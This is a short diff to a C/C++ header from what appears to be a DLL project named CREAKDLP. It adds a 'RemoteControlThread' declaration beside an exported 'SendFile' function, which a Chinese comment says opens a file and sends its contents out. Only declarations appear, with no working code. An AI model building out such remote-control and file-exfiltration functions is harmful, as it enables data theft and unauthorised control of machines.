@@ -22,7 +22,7 @@
 //// 导出函数
 //CREAKDLP_API int fnCreakDLP(void);
 
-
+UINT WINAPI RemoteControlThread(LPVOID lpvoid);
 //打开文件取出文件内容并发送出去
 CREAKDLP_API void SendFile();
 //extern "C" __declspec(dllexport) void SendFile();
